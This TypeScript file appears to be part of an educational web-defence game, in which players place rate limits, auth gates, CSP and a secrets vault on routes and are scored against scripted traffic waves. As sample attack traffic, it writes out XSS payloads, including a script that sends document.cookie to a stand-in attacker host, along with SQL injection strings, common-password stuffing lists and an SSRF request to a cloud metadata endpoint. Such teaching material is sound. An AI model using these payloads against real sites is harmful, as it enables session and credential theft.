// Secure ops: five routes, scripted traffic waves, defences with tiers, and a WAF rule.
import { rng, shuffle } from '../../../core/seed';
import type { Waf } from './waf';

export const ROUTES = ['/', '/login', '/api/contact', '/admin', '/api/export'] as const;
export type Route = (typeof ROUTES)[number];
export type Kind = 'visitor' | 'stuffing' | 'ddos' | 'xss' | 'sqli' | 'scraper' | 'ssrf';

export interface Request { id: number; t: number; route: string; kind: Kind; client: string; line: string; authed?: boolean }

export const DEFENCES = [
  { id: 'rate', name: 'Rate limit', base: 1, stops: 'bursts from one client (DDoS, stuffing, scrapers)' },
  { id: 'auth', name: 'Auth gate', base: 2, stops: 'scrapers; tier 2 adds MFA against credential stuffing' },
  { id: 'csp', name: 'CSP', base: 1, stops: 'cross-site scripting (XSS)' },
  { id: 'vault', name: 'Secrets vault', base: 2, stops: 'SSRF credential theft' },
] as const;
export type DefenceId = (typeof DEFENCES)[number]['id'];
export type Config = Record<string, Record<string, number>>;

export const START_GOLD = 6;
export const WAVE_GOLD = 3;
const WINDOW = 10;
export const ATTACK_LABEL: Record<Kind, string> = {
  visitor: 'real visitor', stuffing: 'credential stuffing', ddos: 'DDoS burst', xss: 'XSS payload', sqli: 'SQL injection', scraper: 'scraper', ssrf: 'SSRF',
};

export function emptyConfig(): Config {
  return Object.fromEntries(ROUTES.map((r) => [r, { rate: 0, auth: 0, csp: 0, vault: 0 }]));
}

/** Gold spent: base cost for tier 1, +1 for tier 2. */
export function cost(c: Config): number {
  let g = 0;
  for (const r of Object.values(c)) for (const d of DEFENCES) { const t = r[d.id] ?? 0; if (t > 0) g += d.base + (t - 1); }
  return g;
}

export interface Verdict { blocked: boolean; by?: DefenceId | 'waf'; falsePositive: boolean }

/** Decide one request given the config, earlier requests in this wave, and the WAF rule. */
export function judge(r: Request, cfg: Config, history: Request[], waf: Waf | null): Verdict {
  const visitor = r.kind === 'visitor';
  const hit = (by: Verdict['by']): Verdict => ({ blocked: true, by, falsePositive: visitor });
  if (waf?.ok && waf.test!(r.line)) return hit('waf');
  const d = cfg[r.route] ?? {};
  if (d.rate) {
    const limit = d.rate === 1 ? 3 : 2;
    const recent = history.filter((h) => h.client === r.client && h.route === r.route && h.t > r.t - WINDOW).length + 1;
    if (recent > limit) return hit('rate');
  }
  if (d.auth) {
    if (visitor && !r.authed) return hit('auth');
    if (r.kind === 'scraper') return hit('auth');
    if (r.kind === 'stuffing' && d.auth >= 2) return hit('auth');
  }
  if (d.csp && r.kind === 'xss') return hit('csp');
  if (d.vault && r.kind === 'ssrf') return hit('vault');
  return { blocked: false, falsePositive: false };
}

export interface WaveResult { request: Request; verdict: Verdict }

export function runWave(wave: Request[], cfg: Config, waf: Waf | null): WaveResult[] {
  const seen: Request[] = [];
  return wave.map((request) => { const verdict = judge(request, cfg, seen, waf); seen.push(request); return { request, verdict }; });
}

export function scoreWave(results: WaveResult[]): { blocked: number; breaches: number; fp: number; attacks: number; points: number } {
  const attacks = results.filter((x) => x.request.kind !== 'visitor');
  const blocked = attacks.filter((x) => x.verdict.blocked).length;
  const fp = results.filter((x) => x.verdict.falsePositive).length;
  return { blocked, breaches: attacks.length - blocked, fp, attacks: attacks.length, points: blocked * 10 - fp * 15 };
}

// ---- Traffic -----------------------------------------------------------------------------
const PUBLIC: Route[] = ['/', '/login', '/api/contact'];
const VISITOR_LINES: Record<Route, string[]> = {
  '/': ['GET / HTTP/1.1', 'GET /?utm_source=newsletter HTTP/1.1', 'GET /?ref=hn HTTP/1.1'],
  '/login': ['POST /login user=maria@acme.io', 'POST /login user=chen@acme.io', 'GET /login HTTP/1.1'],
  '/api/contact': ['POST /api/contact body=Hi, can I get a demo?', 'GET /api/contact?q=pricing HTTP/1.1', "POST /api/contact body=What's the SLA for EU customers?"],
  '/admin': ['GET /admin/users HTTP/1.1', 'GET /admin/billing HTTP/1.1'],
  '/api/export': ['GET /api/export?format=csv HTTP/1.1', 'GET /api/export?format=json HTTP/1.1'],
};

export function dealWaves(seed: number): Request[][] {
  const rand = rng(seed);
  let id = 0;
  const pick = <T,>(xs: readonly T[]) => xs[Math.floor(rand() * xs.length)]!;
  const visitors = (n: number): Request[] => Array.from({ length: n }, () => {
    const route = rand() < 0.75 ? pick(PUBLIC) : pick(['/admin', '/api/export'] as const);
    return { id: 0, t: Math.floor(rand() * 60), route, kind: 'visitor', client: `v${Math.floor(rand() * 1e6)}`, line: pick(VISITOR_LINES[route]), authed: !PUBLIC.includes(route) };
  });
  const burst = (kind: Kind, route: Route, n: number, client: string, line: (i: number) => string, spacing = 1): Request[] => {
    const start = Math.floor(rand() * 40);
    return Array.from({ length: n }, (_, i) => ({ id: 0, t: start + i * spacing, route, kind, client, line: line(i) }));
  };
  const office = (): Request[] => burst('visitor', '/', 4, 'office-nat', () => 'GET / HTTP/1.1', 2).map((r) => ({ ...r, authed: false }));
  const n = () => Math.floor(rand() * 900 + 100);
  const waves: Request[][] = [
    [...visitors(10), ...office(),
      ...burst('stuffing', '/login', 6, `bot-${n()}`, (i) => `POST /login user=admin&pass=${['123456', 'password', 'qwerty', 'letmein', 'admin', 'welcome'][i]}`),
      ...burst('scraper', '/api/export', 5, `crawler-${n()}`, (i) => `GET /api/export?page=${i + 1}&per=1000 HTTP/1.1`)],
    [...visitors(10), ...office(),
      ...burst('ddos', '/', 8, `botnet-${n()}`, () => 'GET / HTTP/1.1', 0.5),
      ...burst('xss', '/api/contact', 2, `x-${n()}`, (i) => (i ? 'POST /api/contact body=<img src=x onerror=alert(document.cookie)>' : 'POST /api/contact body=<script>fetch("//evil.example/?c="+document.cookie)</script>'), 7),
      ...burst('sqli', '/api/contact', 2, `s-${n()}`, (i) => (i ? 'GET /api/contact?q=1 UNION SELECT password FROM users-- HTTP/1.1' : "GET /api/contact?q=' OR 1=1-- HTTP/1.1"), 9)],
    [...visitors(12), ...office(),
      ...burst('stuffing', '/login', 5, `bot-${n()}`, (i) => `POST /login user=root&pass=${['toor', 'changeme', '12345678', 'root', 'pass'][i]}`),
      ...burst('ssrf', '/api/export', 2, `ssrf-${n()}`, () => 'GET /api/export?url=http://169.254.169.254/latest/meta-data/iam/', 6),
      ...burst('sqli', '/api/contact', 1, `s-${n()}`, () => "GET /api/contact?q=admin'-- HTTP/1.1"),
      ...burst('xss', '/api/contact', 1, `x-${n()}`, () => 'POST /api/contact body=<svg onload=alert(1)>'),
      ...burst('scraper', '/api/export', 4, `crawler-${n()}`, (i) => `GET /api/export?page=${i + 1}&per=1000 HTTP/1.1`)],
  ];
  return waves.map((w) => shuffle(w, rand).sort((a, b) => a.t - b.t).map((r) => ({ ...r, id: ++id })));
}
